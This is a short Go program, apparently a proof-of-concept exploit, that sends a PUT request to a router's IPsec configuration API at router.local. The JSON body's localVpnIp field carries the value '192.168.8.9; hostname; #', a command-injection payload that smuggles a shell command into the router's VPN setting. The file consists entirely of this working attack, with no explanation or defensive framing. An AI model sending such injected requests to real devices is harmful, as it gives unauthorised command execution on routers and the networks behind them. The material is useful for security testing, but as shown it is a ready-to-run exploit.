package main
import ("net/http"; "strings")
func main() {
body := "{\"data\":{\"tunnelModeTable\":{\"localVpnIp\":\"192.168.8.9; hostname; #\"}}}"
req, _ := http.NewRequest("PUT", "http://router.local/api/v1/network/ipsec", strings.NewReader(body))
http.DefaultClient.Do(req)
}
